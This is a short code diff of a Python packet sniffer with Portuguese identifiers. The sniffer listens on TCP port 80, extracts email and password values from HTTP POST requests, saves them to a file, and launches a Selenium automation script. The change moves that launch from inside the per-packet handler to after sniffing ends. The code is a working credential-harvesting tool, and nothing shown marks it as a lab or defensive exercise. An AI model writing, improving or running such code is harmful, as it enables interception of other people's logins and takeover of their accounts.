@@ -40,8 +40,6 @@ def processar(pacote):
 
                 # salva imediatamente no arquivo
                 salvar_credenciais(email, senha)
-                time.sleep(1)
-                subprocess.run([python_venv, "selenium_automation.py"])
                 print("-----------------------------------------\n")
 
         except Exception:
@@ -49,4 +47,5 @@ def processar(pacote):
 
 print("[*] Sniffer ativo. Aguardando POSTs decodificados...")
 sniff(filter="tcp port 80", prn=processar, store=False)
+subprocess.run([python_venv, "selenium_automation.py"])
 
